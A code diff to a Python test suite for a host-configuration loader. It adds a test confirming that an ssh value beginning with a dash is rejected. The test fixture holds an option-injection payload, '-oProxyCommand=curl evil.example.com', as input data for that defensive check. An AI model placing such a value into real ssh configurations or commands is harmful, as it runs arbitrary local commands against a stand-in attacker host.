@@ -17,6 +17,10 @@ Test contract:
 - CAMP_CONFIG_DIR points the loader at the overridden directory (it replaces
   the whole app dir; the file is at $CAMP_CONFIG_DIR/hosts.toml, not a nested
   camp/).
+- An `ssh` value beginning with `-` raises, naming the host — such a value is
+  placed by transport.py into the local `ssh` argv in OPTION position (e.g.
+  `ssh = "-oProxyCommand=..."` is option injection), so it must never survive
+  loading.
 """
 
 from __future__ import annotations
@@ -186,9 +190,26 @@ def test_camp_config_dir_replaces_the_whole_app_dir_not_a_nested_camp(
     override_dir = tmp_path / "somewhere-else"
     monkeypatch.setenv("CAMP_CONFIG_DIR", str(override_dir))
     _write_hosts(override_dir, '[hosts.andromeda]\nssh = "andromeda"\n')
-    # Confirm the loader does NOT look under override_dir/camp/hosts.toml.
-    assert not (override_dir / "camp" / "hosts.toml").exists()
 
     hosts = load_hosts()
 
+    # Proves the loader read from override_dir itself (not a nested
+    # override_dir/camp/): a nested lookup would have found nothing and
+    # loaded zero hosts instead of resolving "andromeda" here.
     assert hosts["andromeda"].ssh == "andromeda"
+
+
+def test_ssh_value_beginning_with_dash_raises_naming_the_host(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    config_dir = tmp_path / "cfg"
+    _point_at(monkeypatch, config_dir)
+    _write_hosts(
+        config_dir,
+        '[hosts.andromeda]\nssh = "-oProxyCommand=curl evil.example.com"\n',
+    )
+
+    with pytest.raises(HostConfigError) as exc_info:
+        load_hosts()
+
+    assert "andromeda" in str(exc_info.value)
